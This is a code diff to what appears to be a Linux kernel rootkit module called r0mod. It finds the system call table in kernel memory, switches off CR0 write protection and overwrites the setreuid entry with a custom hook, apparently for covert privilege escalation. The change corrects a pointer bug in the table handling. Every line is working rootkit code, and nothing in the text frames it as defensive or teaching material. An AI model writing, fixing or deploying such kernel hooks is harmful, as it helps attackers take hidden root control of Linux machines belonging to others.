@@ -12,7 +12,7 @@
 #define SEARCH_START    PAGE_OFFSET
 #define SEARCH_END      ULONG_MAX
 
-unsigned long *syscall_table[322];
+unsigned long *syscall_table;
 
 asmlinkage int (*orig_setreuid)(uid_t ruid, uid_t euid);
 
@@ -50,7 +50,7 @@ static int __init r0mod_init(void)
 {
     printk("Module starting...");
 
-    syscall_table[0] = find_sys_call_table();
+    syscall_table = find_sys_call_table();
     if(syscall_table == NULL)
     {
         printk("syscall_table == NULL");
@@ -62,11 +62,9 @@ static int __init r0mod_init(void)
     write_cr0(read_cr0() & (~0x10000));
 
     orig_setreuid = (void *)syscall_table[__NR_setreuid];
-    syscall_table[__NR_setreuid] = (void *)new_setreuid;
+    syscall_table[__NR_setreuid] = new_setreuid;
 
     write_cr0(read_cr0() | 0x10000);
-
-    // Now use sys_call_table
 
     return 0;
 }
